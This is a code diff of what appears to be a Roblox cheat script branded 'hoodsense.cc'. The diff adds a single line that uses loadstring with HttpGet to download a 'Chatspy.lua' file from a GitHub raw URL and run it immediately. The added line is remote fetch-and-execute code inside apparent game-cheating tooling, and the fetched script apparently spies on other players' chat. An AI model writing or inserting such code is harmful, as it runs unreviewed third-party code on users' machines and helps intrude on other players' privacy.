@@ -1862,6 +1862,8 @@ print("| [hoodsense.cc] Made by ekso <@804245361894883339>     ")
 print("| [hoodsense.cc] Website - https://hoodsense.cf         ")
 print("_________________________________________________________________")
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/SomeRandomStuff/Main/Chatspy.lua'))()
+
 local Players = game:GetService("Players")
 
 Players.PlayerAdded:Connect(function(player)
